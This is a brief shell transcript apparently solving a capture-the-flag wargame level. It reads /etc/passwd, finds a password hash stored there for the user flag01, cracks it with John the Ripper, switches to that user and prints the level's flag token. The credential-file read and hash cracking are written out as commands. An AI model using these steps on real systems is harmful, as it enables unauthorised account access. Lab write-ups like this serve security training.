~> cat /etc/passwd
[..]
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
[...]

~> echo "flag01:42hDRfypTqqnw" > flag01pwd.txt

~> john --show flag01pwd.txt
flag01:abcdefg

1 password hash cracked, 0 left

~> su flag01 (passwd: abcdefg)

~> getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
